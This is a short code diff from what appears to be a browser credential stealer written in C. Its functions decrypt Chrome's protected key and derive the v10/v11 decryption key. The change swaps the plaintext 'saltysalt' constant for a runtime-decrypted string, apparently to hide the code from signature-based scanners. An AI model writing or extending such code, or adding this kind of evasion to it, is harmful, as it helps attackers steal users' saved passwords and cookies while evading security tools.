@@ -221,7 +221,7 @@ int chrome_decrypt_dpapi_key(const unsigned char *encrypted_key, size_t len,
 
 int chrome_derive_key(unsigned char *out32) {
     /* Chrome v10/v11 uses empty password, "saltysalt" salt, 1 iteration */
-    static const char salt[] = "saltysalt";
+    char salt[16]; enc_decrypt(enc_saltysalt, ENC_SALTYSALT_LEN, salt);
     static const int iterations = 1;
 
 #ifdef _WIN32
